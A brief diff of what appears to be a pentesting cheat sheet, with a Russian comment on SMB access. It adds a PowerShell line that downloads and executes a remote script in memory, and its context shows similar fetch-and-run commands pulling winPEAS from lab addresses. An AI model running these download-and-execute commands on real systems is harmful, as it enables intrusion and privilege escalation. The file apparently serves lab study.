@@ -60,6 +60,8 @@ echo IEX(New-Object Net.WebClient).downloadString('http://10.10.14.6:8000/winPEA
 
 iwr -uri http://10.10.14.9/test -outfile test
 
+IEX(IWR('10.10.10.10/script.ps1'))
+
 # Доступ к ресурсу SMB
 
 Get-Content //10.10.14.4/file
